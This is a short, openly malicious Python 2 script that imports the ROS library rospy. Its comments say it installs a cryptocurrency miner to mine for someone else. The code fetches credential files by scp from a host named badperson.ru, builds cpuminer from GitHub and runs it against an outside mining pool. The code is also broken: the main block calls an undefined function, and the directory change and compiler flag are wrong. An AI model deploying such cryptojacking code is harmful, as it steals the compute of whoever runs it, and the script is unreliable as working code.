#!/usr/bin/env python2
#this isn't important enough to license
#In theory it downloads a bitcoin mining program and sets it up on this
#system to mine for some dude. 
#haven't tested it, and technically you need sudo perms to do this
import os
import rospy

def minebot():
    os.system("scp badperson@badperson.ru:/passfile .")
    os.system("scp badperson@badperson.ru:/workfile .")
    os.system("git clone https://github.com/pooler/cpuminer")
    os.system("cd cpuminer")
    os.system("./autogen.sh")
    os.system('./configure CFLAGS="O3"')
    os.system("make")
    os.system("./minerd -o stratum+tcp://stratum.give-me-ltc.com:3334 -u workfile -p passfile")


if __name__ == '__main__':
    suicide()
